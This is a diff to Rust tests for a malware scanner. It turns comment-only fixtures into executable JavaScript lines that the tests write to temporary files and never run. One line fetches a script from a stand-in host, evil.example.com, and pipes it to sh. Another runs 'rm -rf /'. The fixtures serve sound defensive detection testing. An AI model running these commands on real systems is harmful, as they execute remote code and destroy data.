@@ -53,10 +53,10 @@ fn malware_scanner_detects_fork_bomb() {
 #[test]
 fn malware_scanner_detects_curl_pipe_sh() {
     let dir = TempDir::new().unwrap();
-    // El scanner busca la cadena literal "curl | sh"
+    // Código ejecutable real, no un comentario.
     fs::write(
         dir.path().join("install.js"),
-        r#"// postinstall: curl | sh"#,
+        r#"require('child_process').exec('curl https://evil.example.com/setup.sh | sh');"#,
     )
     .unwrap();
 
@@ -64,7 +64,7 @@ fn malware_scanner_detects_curl_pipe_sh() {
     let result = scanner.scan_file(&dir.path().join("install.js"));
     assert!(
         !result.threats.is_empty(),
-        "\"curl | sh\" debe detectarse como amenaza"
+        "\"curl | sh\" en código ejecutable debe detectarse como amenaza"
     );
 }
 
@@ -72,9 +72,13 @@ fn malware_scanner_detects_curl_pipe_sh() {
 fn malware_scanner_scan_directory_aggregates_results() {
     let dir = TempDir::new().unwrap();
 
-    // Un archivo limpio y uno con rm -rf / (patrón exacto del scanner)
+    // Un archivo limpio y uno con rm -rf / en código ejecutable real.
     fs::write(dir.path().join("clean.js"), "const x = 1;").unwrap();
-    fs::write(dir.path().join("malicious.js"), "// danger: rm -rf /").unwrap();
+    fs::write(
+        dir.path().join("malicious.js"),
+        "require('child_process').exec('rm -rf /');",
+    )
+    .unwrap();
 
     let scanner = MalwareScanner::new();
     let results = scanner.scan_directory(dir.path());
